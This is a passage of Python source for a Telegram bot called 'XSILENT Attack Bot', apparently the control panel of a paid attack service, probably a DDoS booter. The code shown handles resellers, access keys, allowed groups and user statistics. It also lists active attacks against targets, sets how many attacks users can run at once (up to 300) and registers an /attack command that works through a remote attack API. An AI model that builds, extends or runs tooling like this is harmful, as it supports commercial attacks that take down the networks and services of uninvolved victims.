        await update.message.reply_text("❌ Usage: `/removereseller <user_id>`", parse_mode='MarkdownV2')
        return
    
    try:
        user_id = int(context.args[0])
        if db.remove_reseller(user_id):
            await update.message.reply_text(f"✅ User `{user_id}` is no longer a reseller.", parse_mode='MarkdownV2')
            try:
                await context.bot.send_message(user_id, "❌ Your reseller privileges have been removed.")
            except:
                pass
        else:
            await update.message.reply_text("❌ User was not a reseller.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

@admin_required
async def resellers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    resellers = db.get_resellers()
    if not resellers:
        await update.message.reply_text("📭 No resellers found.", parse_mode='MarkdownV2')
        return
    
    message = "👑 **Reseller List**\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for r in resellers:
        message += f"🆔 User ID: `{r['user_id']}`\n"
        message += f"📅 Added: `{r['added_at'].strftime('%Y-%m-%d %H:%M')}`\n\n"
    
    await update.message.reply_text(message, parse_mode='MarkdownV2')

@admin_required
async def addgroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("❌ Usage: `/addgroup <group_id> [group_name]`\n\nExample: `/addgroup -100123456789 My Group`", parse_mode='MarkdownV2')
        return
    
    try:
        group_id = int(context.args[0])
        group_name = context.args[1] if len(context.args) > 1 else None
        if db.add_allowed_group(group_id, group_name):
            await update.message.reply_text(f"✅ Group `{group_id}` added to allowed list.", parse_mode='MarkdownV2')
        else:
            await update.message.reply_text("❌ Group already exists.")
    except ValueError:
        await update.message.reply_text("❌ Invalid group ID.")

@admin_required
async def removegroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("❌ Usage: `/removegroup <group_id>`", parse_mode='MarkdownV2')
        return
    
    try:
        group_id = int(context.args[0])
        if db.remove_allowed_group(group_id):
            await update.message.reply_text(f"✅ Group `{group_id}` removed from allowed list.", parse_mode='MarkdownV2')
        else:
            await update.message.reply_text("❌ Group not found.")
    except ValueError:
        await update.message.reply_text("❌ Invalid group ID.")

@admin_required
async def groups_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    groups = db.get_groups()
    if not groups:
        await update.message.reply_text("📭 No allowed groups.\n\nUse `/addgroup` to add a group.", parse_mode='MarkdownV2')
        return
    
    message = "👥 **Allowed Groups**\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for g in groups:
        name = f" - {escape_markdown(g.get('name'))}" if g.get('name') else ""
        message += f"🆔 `{g['group_id']}`{name}\n"
    
    await update.message.reply_text(message, parse_mode='MarkdownV2')

@admin_required
async def admin_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = db.get_all_users()
    
    if not users:
        await update.message.reply_text("📭 No users found.", parse_mode='MarkdownV2')
        return
    
    approved_count = sum(1 for u in users if u.get("approved", False))
    total_attacks = sum(u.get("total_attacks", 0) for u in users)
    expired_count = 0
    
    for user in users:
        expires_at = user.get("expires_at")
        if expires_at:
            expires_at = make_aware(expires_at)
            if expires_at < get_current_time():
                expired_count += 1
    
    message = (
        f"👥 **User Statistics**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 Total Users: `{len(users)}`\n"
        f"✅ Approved: `{approved_count}`\n"
        f"❌ Expired: `{expired_count}`\n"
        f"🎯 Total Attacks: `{total_attacks}`\n\n"
        f"📋 **Recent Users:**\n"
    )
    
    for user in users[:10]:
        user_id = user.get('user_id', 'Unknown')
        status = "✅" if user.get("approved", False) else "❌"
        attacks = user.get("total_attacks", 0)
        message += f"`{user_id}` → {status} | {attacks} attacks\n"
    
    await update.message.reply_text(message, parse_mode='MarkdownV2')

@admin_required
async def api_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    status_msg = await update.message.reply_text("🔄 **Checking API health...**", parse_mode='MarkdownV2')
    
    health = check_api_health()
    
    if health.get("status") == "ok":
        message = (
            f"✅ **API Status: Healthy**\n\n"
            f"🕐 Timestamp: `{health.get('timestamp', 'N/A')}`\n"
            f"📦 Version: `{health.get('version', 'N/A')}`\n\n"
            f"🌐 API URL: `{API_URL}`"
        )
    else:
        message = (
            f"❌ **API Status: Unhealthy**\n\n"
            f"Error: `{health.get('error', 'Unknown error')}`\n\n"
            f"🌐 API URL: `{API_URL}`\n\n"
            f"📌 Possible issues:\n"
            f"• API server is down\n"
            f"• Network connection problem\n"
            f"• Invalid API key"
        )
    
    await status_msg.edit_text(message, parse_mode='MarkdownV2')

@admin_required
async def running_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    status_msg = await update.message.reply_text("🔄 **Fetching active attacks...**", parse_mode='MarkdownV2')
    
    attacks = check_running_attacks()
    
    if attacks.get("success"):
        active_attacks = attacks.get("activeAttacks", [])
        if active_attacks:
            message = f"🎯 **Active Attacks** (`{len(active_attacks)}`)\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
            for attack in active_attacks[:10]:
                message += (
                    f"🔹 Target: `{attack.get('target', 'N/A')}`\n"
                    f"   ⏱️ Expires in: `{attack.get('expiresIn', 'N/A')}`s\n\n"
                )
        else:
            message = "✅ **No active attacks** running on API."
        
        message += f"\n━━━━━━━━━━━━━━━━━━━━━━\n"
        message += f"📊 Current: `{attacks.get('count', 0)}` / `{attacks.get('maxConcurrent', 0)}`\n"
        message += f"📌 Remaining slots: `{attacks.get('remainingSlots', 0)}`"
    else:
        message = f"❌ **Failed to fetch active attacks**\n\nError: `{attacks.get('error', 'Unknown error')}`"
    
    await status_msg.edit_text(message, parse_mode='MarkdownV2')

@admin_required
async def bot_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = db.get_bot_stats()
    api_stats = get_api_stats()
    
    message = (
        f"📊 **Bot Statistics**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 **Users:**\n"
        f"• Total: `{stats['total_users']}`\n"
        f"• Approved: `{stats['approved_users']}`\n\n"
        f"🎯 **Attacks:**\n"
        f"• Total: `{stats['total_attacks']}`\n"
        f"• Today: `{stats['today_attacks']}`\n\n"
        f"⚙️ **Concurrent Limit:** `{db.get_concurrent_limit()}`\n"
        f"📌 **Active in Memory:** `{len(context.bot_data.get('active_attacks', {}))}`"
    )
    
    if api_stats.get("success"):
        message += f"\n\n🌐 **API Stats:**\n"
        message += f"• Active: `{api_stats.get('activeAttacks', 0)}`\n"
        message += f"• Max Concurrent: `{api_stats.get('maxConcurrent', 0)}`"
    
    await update.message.reply_text(message, parse_mode='MarkdownV2')

@admin_required
async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set max concurrent attacks: /set_concurrent 5 (1-300)"""
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ **Usage:** `/set_concurrent <1-300>`\n\n"
            "Example: `/set_concurrent 5`\n"
            "This allows maximum 5 concurrent attacks.",
            parse_mode='MarkdownV2'
        )
        return
    
    try:
        limit = int(context.args[0])
        if limit < 1 or limit > 300:
            await update.message.reply_text("❌ Limit must be between **1** and **300**.", parse_mode='MarkdownV2')
            return
        
        db.set_concurrent_limit(limit)
        await update.message.reply_text(
            f"✅ **Concurrent attack limit set to `{limit}`**\n\n"
            f"📌 Users can now run up to `{limit}` attacks simultaneously.\n"
            f"🔄 This change takes effect immediately.",
            parse_mode='MarkdownV2'
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid number. Please enter a number between 1-300.", parse_mode='MarkdownV2')

# ==================== MAIN ====================
async def post_init(application: Application):
    """Setup background tasks after bot starts"""
    # Initialize active attacks dict
    application.bot_data['active_attacks'] = {}
    
    # Setup job queue for checking attack completion
    job_queue = application.job_queue
    if job_queue:
        job_queue.run_repeating(check_attack_completion, interval=5, first=5)
        logger.info("✅ Background task started: attack completion checker")
    else:
        logger.warning("⚠️ Job queue not available")

def main():
    """Start the bot"""
    print("🚀 Starting XSILENT Attack Bot...")
    print(f"📊 Admin IDs: {ADMIN_IDS}")
    print(f"🌐 API URL: {API_URL}")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add user commands
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("myattacks", myattacks_command))
    application.add_handler(CommandHandler("myinfo", myinfo_command))
    application.add_handler(CommandHandler("mystats", mystats_command))
    application.add_handler(CommandHandler("blockedports", blockedports_command))
    application.add_handler(CommandHandler("status", user_status_command))
    
    # Reseller commands
    application.add_handler(CommandHandler("genkey", genkey_command))
    application.add_handler(CommandHandler("keys", keys_command))
    application.add_handler(CommandHandler("approveuser", approveuser_command))
    
    # Admin commands
    application.add_handler(CommandHandler("approve", admin_approve_command))
    application.add_handler(CommandHandler("disapprove", admin_disapprove_command))
    application.add_handler(CommandHandler("delkey", delkey_command))
    application.add_handler(CommandHandler("addreseller", addreseller_command))
    application.add_handler(CommandHandler("removereseller", removereseller_command))
    application.add_handler(CommandHandler("resellers", resellers_command))
    application.add_handler(CommandHandler("addgroup", addgroup_command))
    application.add_handler(CommandHandler("removegroup", removegroup_command))
    application.add_handler(CommandHandler("groups", groups_command))
    application.add_handler(CommandHandler("users", admin_users_command))
    application.add_handler(CommandHandler("api_status", api_status_command))
    application.add_handler(CommandHandler("running", running_command))
    application.add_handler(CommandHandler("stats", bot_stats_command))
    application.add_handler(CommandHandler("set_concurrent", set_concurrent_command))
    
    # Setup post_init
    application.post_init = post_init
    
    # Start bot
    print("✅ Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
